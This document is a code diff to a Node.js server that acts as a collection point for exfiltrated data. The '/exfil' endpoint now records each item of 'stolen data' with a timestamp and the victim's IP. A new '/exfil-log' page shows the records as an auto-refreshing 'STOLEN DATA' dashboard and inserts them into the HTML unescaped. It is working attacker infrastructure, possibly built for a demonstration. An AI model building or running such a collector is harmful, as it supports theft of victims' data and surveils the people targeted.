@@ -2,6 +2,7 @@ import http from 'node:http';
 
 const PORT = process.env.PORT || 3000;
 const requestLogs = [];
+const exfilLogs = [];
 
 const server = http.createServer((req, res) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
@@ -55,9 +56,35 @@ const server = http.createServer((req, res) => {
 
   if (url.pathname === '/exfil') {
     const data = url.searchParams.get('d');
+    const entry = { time: new Date().toISOString(), data, ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress };
+    exfilLogs.push(entry);
     console.log('[EXFIL] Received stolen data:', data);
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     return res.end('ok');
+  }
+
+  if (url.pathname === '/exfil-log') {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    const rows = exfilLogs.slice().reverse().map(e => `
+      <tr>
+        <td>${e.time}</td>
+        <td>${e.ip}</td>
+        <td><pre style="margin:0;white-space:pre-wrap;word-break:break-all">${e.data}</pre></td>
+      </tr>`).join('');
+    return res.end(`<!DOCTYPE html><html><head><title>Exfiltrated Data</title>
+      <meta http-equiv="refresh" content="3">
+      <style>body{font-family:monospace;margin:20px;background:#1a1a1a;color:#eee}
+      table{border-collapse:collapse;width:100%}
+      th,td{border:1px solid #444;padding:8px 12px;text-align:left}
+      th{background:#c0392b;color:#fff}
+      tr:nth-child(even){background:#222}
+      pre{color:#e74c3c;font-size:14px}
+      h1{color:#e74c3c}</style>
+      </head><body>
+      <h1>STOLEN DATA (${exfilLogs.length} entries) -- auto-refreshes every 3s</h1>
+      ${exfilLogs.length === 0 ? '<p style="color:#888">Waiting for exfiltrated data...</p>' : ''}
+      <table><tr><th>Time</th><th>Victim IP</th><th>Stolen Data</th></tr>${rows}</table>
+      </body></html>`);
   }
 
   if (url.pathname === '/gcp') {
